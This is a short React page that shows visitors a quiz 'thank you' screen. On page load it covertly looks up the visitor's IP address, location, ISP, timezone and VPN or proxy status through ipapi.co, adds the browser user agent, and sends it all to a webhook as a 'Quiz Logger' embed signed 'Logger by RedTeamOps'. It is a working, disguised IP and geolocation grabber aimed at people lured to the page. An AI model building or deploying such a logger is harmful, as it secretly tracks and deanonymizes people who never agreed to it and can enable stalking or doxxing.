import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(async data => {
        // Ensure we're getting the IPv4 address
        const ip = data.ip.includes(':') ? data.ipv4 : data.ip; // fallback to IPv4

        // Build the webhook embed object
        const embed = {
          username: "Quiz Logger",
          embeds: [{
            title: "📥 Quiz Submission Logged",
            color: 0x7289DA,
            fields: [
              { name: "IP", value: ip, inline: true },
              { name: "City", value: data.city, inline: true },
              { name: "Region", value: data.region, inline: true },
              { name: "Country", value: data.country_name, inline: true },
              { name: "ISP", value: data.org, inline: false },
              { name: "TimeZone", value: data.timezone, inline: true },
              { name: "User Agent", value: navigator.userAgent, inline: false },
              { name: "Is VPN", value: data.is_vpn ? "Yes" : "No", inline: true },
              { name: "Is Proxy", value: data.is_proxy ? "Yes" : "No", inline: true },
              { name: "Is Bot", value: data.is_bot ? "Yes" : "No", inline: true }
            ],
            footer: { text: "Logger by RedTeamOps" },
            timestamp: new Date().toISOString()
          }]
        };

        // Send data to the webhook endpoint
        await fetch("/api/webhook", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(embed)
        });
      });
  }, []);

  return (
    <div style={{
      background: 'url("/bg.jpg") center center / cover no-repeat',
      height: "100vh",
      color: "white",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      textAlign: "center",
      fontSize: "1.5rem"
    }}>
      <div>
        <h1>✅ Thank you for your quiz submission!</h1>
        <p>You may kindly close this tab now.</p>
      </div>
    </div>
  );
}
